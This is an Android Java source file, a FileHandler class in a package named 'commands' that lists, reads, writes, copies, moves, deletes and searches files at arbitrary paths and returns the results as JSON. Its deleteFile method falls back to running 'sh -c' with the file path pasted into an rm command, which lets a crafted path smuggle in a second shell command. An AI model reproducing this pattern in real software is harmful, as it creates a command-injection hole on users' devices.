package com.task.tusker.commands;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Base64;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;

/**
 * File Handler - File operations
 */
public class FileHandler {

    private Context context;

    public FileHandler(Context context) {
        this.context = context;
    }

    /**
     * List files in directory
     */
    public JSONObject listFiles(String path) {
        JSONObject result = new JSONObject();
        
        try {
            if (path == null || path.isEmpty()) {
                path = context.getFilesDir().getPath();
            }

            File directory = new File(path);
            
            if (!directory.exists()) {
                result.put("success", false);
                result.put("error", "Directory does not exist");
                return result;
            }

            if (!directory.isDirectory()) {
                result.put("success", false);
                result.put("error", "Path is not a directory");
                return result;
            }

            File[] files = directory.listFiles();
            JSONArray fileList = new JSONArray();
            
            if (files != null) {
                for (File file : files) {
                    JSONObject fileInfo = new JSONObject();
                    fileInfo.put("name", file.getName());
                    fileInfo.put("path", file.getAbsolutePath());
                    fileInfo.put("isDirectory", file.isDirectory());
                    fileInfo.put("size", file.length());
                    fileInfo.put("lastModified", file.lastModified());
                    fileInfo.put("canRead", file.canRead());
                    fileInfo.put("canWrite", file.canWrite());
                    fileInfo.put("isHidden", file.isHidden());
                    fileList.put(fileInfo);
                }
            }

            result.put("success", true);
            result.put("path", path);
            result.put("files", fileList);
            result.put("count", fileList.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Read file content
     */
    public JSONObject readFile(String filePath, boolean asBase64) {
        JSONObject result = new JSONObject();
        
        try {
            File file = new File(filePath);
            
            if (!file.exists()) {
                result.put("success", false);
                result.put("error", "File does not exist");
                return result;
            }

            if (!file.canRead()) {
                result.put("success", false);
                result.put("error", "Cannot read file");
                return result;
            }

            if (file.length() > 10 * 1024 * 1024) { // 10MB limit
                result.put("success", false);
                result.put("error", "File too large (max 10MB)");
                return result;
            }

            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();

            if (asBase64) {
                String base64 = Base64.encodeToString(data, Base64.DEFAULT);
                result.put("content", base64);
                result.put("encoding", "base64");
            } else {
                String content = new String(data, "UTF-8");
                result.put("content", content);
                result.put("encoding", "utf-8");
            }

            result.put("success", true);
            result.put("filePath", filePath);
            result.put("size", file.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Write file
     */
    public JSONObject writeFile(String filePath, String content, boolean isBase64) {
        JSONObject result = new JSONObject();
        
        try {
            File file = new File(filePath);
            
            // Create parent directories if needed
            File parent = file.getParentFile();
            if (parent != null && !parent.exists()) {
                parent.mkdirs();
            }

            FileOutputStream fos = new FileOutputStream(file);
            
            if (isBase64) {
                byte[] data = Base64.decode(content, Base64.DEFAULT);
                fos.write(data);
            } else {
                fos.write(content.getBytes("UTF-8"));
            }
            
            fos.close();

            result.put("success", true);
            result.put("filePath", filePath);
            result.put("size", file.length());
            result.put("message", "File written successfully");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Delete file — tries standard delete first, then ContentResolver for media,
     * then shell rm as last resort.
     */
    public JSONObject deleteFile(String filePath) {
        JSONObject result = new JSONObject();
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                result.put("success", false);
                result.put("error", "File does not exist: " + filePath);
                return result;
            }

            // 1) Standard Java delete
            boolean deleted = false;
            try { deleted = file.delete(); } catch (Exception ignored) {}

            // 2) ContentResolver (MediaStore) — works for media files on Android 10+
            if (!deleted && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    ContentResolver cr = context.getContentResolver();
                    Uri[] uris = {
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                        MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                        MediaStore.Files.getContentUri("external")
                    };
                    for (Uri baseUri : uris) {
                        Cursor cursor = cr.query(baseUri,
                            new String[]{MediaStore.MediaColumns._ID},
                            MediaStore.MediaColumns.DATA + "=?",
                            new String[]{filePath}, null);
                        if (cursor != null && cursor.moveToFirst()) {
                            long id = cursor.getLong(0);
                            cursor.close();
                            Uri itemUri = Uri.withAppendedPath(baseUri, String.valueOf(id));
                            int rows = cr.delete(itemUri, null, null);
                            if (rows > 0) { deleted = true; break; }
                        } else if (cursor != null) { cursor.close(); }
                    }
                } catch (Exception ignored) {}
            }

            // 3) Shell rm (works with root or if shell has permission)
            if (!deleted) {
                try {
                    Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "rm -f \"" + filePath + "\""});
                    p.waitFor();
                    deleted = !file.exists();
                } catch (Exception ignored) {}
            }

            result.put("success", deleted);
            result.put("filePath", filePath);
            result.put("message", deleted ? "File deleted" : "Could not delete — grant All Files Access in Settings");
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("filePath", filePath);
                result.put("error", e.getMessage());
            } catch (JSONException ex) { ex.printStackTrace(); }
        }
        return result;
    }

    /**
     * Copy file
     */
    public JSONObject copyFile(String sourcePath, String destPath) {
        JSONObject result = new JSONObject();
        
        try {
            File source = new File(sourcePath);
            File dest = new File(destPath);
            
            if (!source.exists()) {
                result.put("success", false);
                result.put("error", "Source file does not exist");
                return result;
            }

            FileInputStream fis = new FileInputStream(source);
            FileOutputStream fos = new FileOutputStream(dest);
            
            byte[] buffer = new byte[1024];
            int length;
            while ((length = fis.read(buffer)) > 0) {
                fos.write(buffer, 0, length);
            }
            
            fis.close();
            fos.close();

            result.put("success", true);
            result.put("sourcePath", sourcePath);
            result.put("destPath", destPath);
            result.put("size", dest.length());
            result.put("message", "File copied successfully");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Move/Rename file
     */
    public JSONObject moveFile(String sourcePath, String destPath) {
        JSONObject result = new JSONObject();
        
        try {
            File source = new File(sourcePath);
            File dest = new File(destPath);
            
            if (!source.exists()) {
                result.put("success", false);
                result.put("error", "Source file does not exist");
                return result;
            }

            boolean moved = source.renameTo(dest);

            result.put("success", moved);
            result.put("sourcePath", sourcePath);
            result.put("destPath", destPath);
            result.put("message", moved ? "File moved successfully" : "Failed to move file");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Create directory
     */
    public JSONObject createDirectory(String path) {
        JSONObject result = new JSONObject();
        
        try {
            File directory = new File(path);
            
            if (directory.exists()) {
                result.put("success", false);
                result.put("error", "Directory already exists");
                return result;
            }

            boolean created = directory.mkdirs();

            result.put("success", created);
            result.put("path", path);
            result.put("message", created ? "Directory created" : "Failed to create directory");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get file info
     */
    public JSONObject getFileInfo(String filePath) {
        JSONObject result = new JSONObject();
        
        try {
            File file = new File(filePath);
            
            if (!file.exists()) {
                result.put("success", false);
                result.put("error", "File does not exist");
                return result;
            }

            result.put("success", true);
            result.put("name", file.getName());
            result.put("path", file.getAbsolutePath());
            result.put("isDirectory", file.isDirectory());
            result.put("isFile", file.isFile());
            result.put("size", file.length());
            result.put("lastModified", file.lastModified());
            result.put("canRead", file.canRead());
            result.put("canWrite", file.canWrite());
            result.put("canExecute", file.canExecute());
            result.put("isHidden", file.isHidden());
            
            if (file.getParent() != null) {
                result.put("parent", file.getParent());
            }
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Search files
     */
    public JSONObject searchFiles(String directory, String query) {
        JSONObject result = new JSONObject();
        
        try {
            File dir = new File(directory);
            
            if (!dir.exists() || !dir.isDirectory()) {
                result.put("success", false);
                result.put("error", "Invalid directory");
                return result;
            }

            JSONArray matches = new JSONArray();
            searchRecursive(dir, query.toLowerCase(), matches);

            result.put("success", true);
            result.put("query", query);
            result.put("directory", directory);
            result.put("matches", matches);
            result.put("count", matches.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Recursive file search
     */
    private void searchRecursive(File directory, String query, JSONArray matches) throws JSONException {
        File[] files = directory.listFiles();
        
        if (files != null) {
            for (File file : files) {
                if (file.getName().toLowerCase().contains(query)) {
                    JSONObject fileInfo = new JSONObject();
                    fileInfo.put("name", file.getName());
                    fileInfo.put("path", file.getAbsolutePath());
                    fileInfo.put("isDirectory", file.isDirectory());
                    fileInfo.put("size", file.length());
                    matches.put(fileInfo);
                }
                
                if (file.isDirectory() && matches.length() < 100) { // Limit results
                    searchRecursive(file, query, matches);
                }
            }
        }
    }
}
